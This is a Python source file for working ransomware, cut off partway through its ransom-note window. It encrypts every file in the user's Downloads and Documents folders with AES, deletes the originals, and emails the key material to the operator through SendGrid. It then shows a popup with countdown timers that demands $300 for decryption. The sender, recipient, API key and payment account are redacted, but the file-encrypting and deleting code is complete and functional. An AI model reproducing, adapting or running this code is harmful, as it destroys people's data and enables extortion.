import os
import glob
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail
from datetime import datetime
import base64  # To store AES key as a string

# Encrypt data with AES
def encrypt_with_aes(data, aes_key, aes_iv):
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# Decrypt data with AES
def decrypt_with_aes(encrypted_data, aes_key, aes_iv):
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(aes_iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data) + decryptor.finalize()

# Encrypt AES key with RSA public key
def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
    encrypted_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

# Decrypt AES key with RSA private key
def decrypt_aes_key_with_rsa(encrypted_aes_key, private_key):
    decrypted_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted_key

# Encrypt files in the directory and add ".aes" extension
def encrypt_files_in_directory(directory_path, aes_key, aes_iv):
    files = glob.glob(os.path.join(directory_path, '*'))
    
    for file_path in files:
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            encrypted_data = encrypt_with_aes(file_data, aes_key, aes_iv)
            encrypted_file_path = file_path + '.aes'
            
            with open(encrypted_file_path, 'wb') as ef:
                ef.write(encrypted_data)
            
            os.remove(file_path)
            print(f"Encrypted and removed: {file_path}")

# Decrypt files in the directory and remove the ".aes" extension
def decrypt_files_in_directory(directory_path, aes_key, aes_iv):
    files = glob.glob(os.path.join(directory_path, '*.aes'))  # Only decrypt encrypted files (.aes)
    
    for file_path in files:
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()

            decrypted_data = decrypt_with_aes(encrypted_data, aes_key, aes_iv)
            decrypted_file_path = file_path.replace('.aes', '')  # Remove .aes extension

            with open(decrypted_file_path, 'wb') as df:
                df.write(decrypted_data)

            os.remove(file_path)  # Delete the encrypted file
            print(f"Decrypted and removed: {file_path}")

# Send private key via email
def send_private_key_via_email(private_key, encrypted_aes_key, aes_iv):
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Encode encrypted AES key and IV in Base64 format for email
    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode('utf-8')
    aes_iv_b64 = base64.b64encode(aes_iv).decode('utf-8')

    message = Mail(
        from_email='REDACTED_SENDER_EMAIL',
        to_emails='REDACTED_RECEIVER_EMAIL',
        subject='Your RSA Private Key',
        plain_text_content=f'Here is your private key:\n\n{pem_private_key.decode("utf-8")}\n\n'
                           f'Encrypted AES Key (Base64): {encrypted_aes_key_b64}\n'
                           f'AES IV (Base64): {aes_iv_b64}'
    )

    try:
        sg = SendGridAPIClient('REDACTED_SENDGRID_API_KEY')
        response = sg.send(message)
        print(response.status_code)
        print(response.body)
        print(response.headers)
    except Exception as e:
        print(str(e))

# Open a window for the user to enter their private key and decrypt files
def decrypt_files():
    window = tk.Toplevel()
    window.title("Enter your private key")
    window.geometry("600x400")
    window.configure(bg='#b30000')

    # Title
    label = tk.Label(window, text="Please enter your private key (PEM format):", font=("Helvetica", 14), fg="white", bg='#b30000')
    label.pack(pady=10)

    # Text area for entering the private key
    text_area = scrolledtext.ScrolledText(window, width=70, height=10, font=("Helvetica", 12))
    text_area.pack(padx=20, pady=10)

    # Confirm button
    def submit_key():
        private_key_pem = text_area.get("1.0", tk.END).strip()
        if not private_key_pem:
            messagebox.showerror("Error", "You must enter a valid private key!")
            return
        try:
            private_key = serialization.load_pem_private_key(
                private_key_pem.encode(),
                password=None,
                backend=default_backend()
            )

            # Replace with the actual encrypted AES key and IV used during encryption
            encrypted_aes_key_b64 = simpledialog.askstring("Input", "Enter the encrypted AES key (Base64):")
            aes_iv_b64 = simpledialog.askstring("Input", "Enter the AES IV (Base64):")

            encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
            aes_iv = base64.b64decode(aes_iv_b64)

            # Decrypt the AES key
            decrypted_aes_key = decrypt_aes_key_with_rsa(encrypted_aes_key, private_key)

            # Print sizes of AES key and IV for verification
            print(f"Decrypted AES Key: {decrypted_aes_key}, Length: {len(decrypted_aes_key)}")
            print(f"AES IV: {aes_iv}, Length: {len(aes_iv)}")

            downloads_path = os.path.expanduser("~/Downloads")
            documents_path = os.path.expanduser("~/Documents")
            
            decrypt_files_in_directory(downloads_path, decrypted_aes_key, aes_iv)
            decrypt_files_in_directory(documents_path, decrypted_aes_key, aes_iv)

            messagebox.showinfo("Success", "Files have been successfully decrypted!")
            window.destroy()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to decrypt files: {str(e)}")

    btn_submit = tk.Button(window, text="Submit", font=("Helvetica", 14), bg="#ffcc00", fg="black", command=submit_key)
    btn_submit.pack(pady=20)

# Main function to encrypt files and notify the user
def encrypt_and_notify():
    aes_key = os.urandom(32)  # AES-256 key
    aes_iv = os.urandom(16)   # AES IV

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)

    downloads_path = os.path.expanduser("~/Downloads")
    documents_path = os.path.expanduser("~/Documents")
    encrypt_files_in_directory(downloads_path, aes_key, aes_iv)
    encrypt_files_in_directory(documents_path, aes_key, aes_iv)

    send_private_key_via_email(private_key, encrypted_aes_key, aes_iv)

    print("Encryption completed and private key sent via email.")

    ransom_popup()

# Get the current time
def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Display the ransom notification popup
def ransom_popup():
    window = tk.Tk()
    window.title("Ooops, your files have been encrypted!")
    window.geometry("700x600")
    window.configure(bg='#b30000')

    label_title = tk.Label(window, text="Ooops, your files have been encrypted!",
                           font=("Helvetica", 20, "bold"), fg="white", bg='#b30000')
    label_title.pack(pady=10)

    content_frame = tk.Frame(window, bg='#ffffff', padx=10, pady=10)
    content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    label_desc = tk.Label(content_frame, text="Your important files are encrypted. Many of your documents, photos, "
                                              "videos, databases and other files are no longer accessible because they "
                                              "have been encrypted. Nobody can recover your files without our "
                                              "decryption service.", 
                          justify="left", wraplength=650, bg='#ffffff', fg='#000000', font=("Helvetica", 14))
    label_desc.pack(anchor="w", pady=10)

    frame_countdown = tk.Frame(content_frame, bg='#b30000')
    frame_countdown.pack(fill=tk.X, pady=10)

    label_payment_raised = tk.Label(frame_countdown, text="Payment will be raised on",
                                    font=("Helvetica", 14, "bold"), fg="yellow", bg='#b30000')
    label_payment_raised.grid(row=0, column=0, sticky="w", padx=5)

    label_time_left = tk.Label(frame_countdown, text=f"{get_current_time()}\nTime Left: 02:23:59:07",
                               font=("Helvetica", 14), fg="white", bg='#b30000')
    label_time_left.grid(row=1, column=0, sticky="w", padx=5)

    label_files_lost = tk.Label(frame_countdown, text="Your files will be lost on",
                                font=("Helvetica", 14, "bold"), fg="yellow", bg='#b30000')
    label_files_lost.grid(row=2, column=0, sticky="w", padx=5)

    label_time_lost = tk.Label(frame_countdown, text="2024-12-31 05:03:41\nTime Left: 06:23:59:07",
                               font=("Helvetica", 14), fg="white", bg='#b30000')
    label_time_lost.grid(row=3, column=0, sticky="w", padx=5)

    label_payment_info = tk.Label(content_frame, text="Send $300 to this account:\n"
                                                     "REDACTED_ACCOUNT_INFO\n\n"
                                                     "After I receive the payment, I will send a text file containing \n"
                                                     "the decryption key into the system.",
